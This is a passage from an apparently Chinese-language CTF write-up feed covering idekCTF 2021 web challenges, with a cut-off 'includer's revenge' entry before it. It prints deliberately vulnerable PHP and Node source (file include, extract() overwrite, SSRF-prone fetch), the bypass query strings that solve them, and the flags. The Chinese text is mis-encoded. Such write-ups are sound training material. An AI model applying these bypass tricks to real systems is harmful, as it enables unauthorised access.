&lt;span style="color:#111">$rmf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">include_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$page&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://gist.github.com/parrot409/3919a4e6ab1eae76d051c5a4d4cfa737">https://gist.github.com/parrot409/3919a4e6ab1eae76d051c5a4d4cfa737&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tttang.com/archive/1384/#toc_0x03-counter-nginx-request-body-temp-lfi">https://tttang.com/archive/1384/#toc_0x03-counter-nginx-request-body-temp-lfi&lt;/a>&lt;/p>
&lt;h2 id="includers-revenge">***includer&amp;rsquo;s revenge&lt;/h2>
&lt;blockquote>
&lt;p>Just sitting here and waiting for PHP 8.1 (lolphp).&lt;/p>
&lt;p>http://65.108.176.254:8088/&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;read&amp;#39;&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;read&amp;#39;&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#75af00">readfile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">include_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">??&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€å¥è¯phpï¼Œä¸ä¼šï¼Œæ‘†äº†&lt;/p>
&lt;p>Zeddå¸ˆå‚…è¿™ç¯‡å¤ªå¼ºäº†ï¼Œæ·±å…¥åˆ†æžNginx-&amp;gt;https://tttang.com/archive/1384/&lt;/p>
&lt;p>ä½œä¸ºä¸€åwebçº¯èœç‹—ï¼Œå¤ªä½©æœå‡ºé¢˜äººäº†ï¼Œæ˜¯çœŸçš„å¼ºï¼Œå¥½åŽ‰å®³å•Šå•Šå•Šå•Šå•Šå•Šå•Š&lt;/p></description></item><item><title>idekCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/12/15/idekctf2021-wp/</link><pubDate>Wed, 15 Dec 2021 21:11:49 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/15/idekctf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctf.idek.team/Challenges">https://ctf.idek.team/Challenges&lt;/a> æ³¨å†Œä¹‹åŽä¸€ç›´æ”¶ä¸åˆ°éªŒè¯é‚®ä»¶ï¼Œgmailå’Œqqé‚®ç®±éƒ½ä¸è¡Œï¼Œä½†æ˜¯å¥½åƒå¯ä»¥ç›´æŽ¥çœ‹é¢˜&lt;/p>
&lt;h2 id="memory-of-php">Memory of PHP&lt;/h2>
&lt;blockquote>
&lt;p>Try to understand how string and variable work in php and also url.
&lt;a href="http://memory-of-php.rf.gd/">http://memory-of-php.rf.gd/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/lib.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;QUERY_STRING&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/best-team/i&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Who is the best team?&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;best-team&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;idek_is_the_best&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;That a right answer, Here is my prize, &amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?best-team=idek_is_the_best
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011843966.png" alt="image-20211212011843966">&lt;/p>
&lt;p>è¿›å…¥http://memory-of-php.rf.gd/secure-bypass.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/lib2.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Your url is interesting, here is prize &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> &amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Plz make me interest with your url &amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/secure-bypass.php?url[15]=1
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212090944967.png" alt="image-20211212090944967">&lt;/p>
&lt;p>&lt;code>idek{nu11_by1e_bypass1ng_1s_C0ol!_ftw_br0!!!!}&lt;/code>&lt;/p>
&lt;h2 id="cookie-and-milk">Cookie-and-milk&lt;/h2>
&lt;blockquote>
&lt;p>I love to eat cookie and milk together. And you?&lt;/p>
&lt;p>&lt;a href="http://cookie-and-milk.rf.gd/">http://cookie-and-milk.rf.gd/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__DIR__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/lib.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;I love c0000000000000000000000000000000000000kie&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;idek&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212100510880.png" alt="image-20211212100510880">&lt;/p>
&lt;p>æ¯”è¾ƒç‹—çš„ä¸€ç‚¹æ˜¯å®ƒé‡å®šå‘çš„æ—¶å€™ä¼šåˆ é™¤æˆ‘ä»¬çš„cookieï¼Œæ‰€ä»¥è¦å•ç‹¬æŠ“åŒ…æ”¹ä¸€ä¸‹&lt;/p>
&lt;p>&lt;code>idek{C0okie_s1ea1ing_1s_c0ol!!!}&lt;/code>&lt;/p>
&lt;h2 id="difference-check">difference-check&lt;/h2>
&lt;blockquote>
&lt;p>It&amp;rsquo;s important two know what differences exist, so I created a simple tool to check the difference between two websites!&lt;/p>
&lt;p>&lt;a href="http://difference-check.chal.idek.team">http://difference-check.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip">https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>å¯ä»¥æä¾›ä¸¤ä¸ªurlï¼Œä¼šè¿›è¡Œdiffç„¶åŽè¿”å›žç»“æžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212091244418.png" alt="image-20211212091244418">&lt;/p>
&lt;p>ä½¿ç”¨çš„æ˜¯node-fetchå’Œdiffåº“ï¼›åº·ä¸€åº·æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">bodyParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;body-parser&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">ssrfFilter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ssrf-req-filter&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;node-fetch&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Diff&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;diff&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">hbs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express-handlebars&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;idek{REDACTED}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">urlencoded&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">extended&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">}));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">engine&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hbs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">hbs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">engine&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">defaultLayout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;main&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">extname&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;.hbs&amp;#39;&lt;/span>
&lt;span style="color:#111">}));&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;view engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;hbs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">validifyURL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">valid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">ssrfFilter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)})&lt;/span>
&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">diffURLs&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pageOne&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">()}));&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">pageTwo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urls&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">text&lt;/span>&lt;span style="color:#111">()}));&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">Diff&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">diffLines&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">pageOne&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">pageTwo&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;error!&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;::1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Forbidden&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">503&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/diff&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">url1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">url2&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>
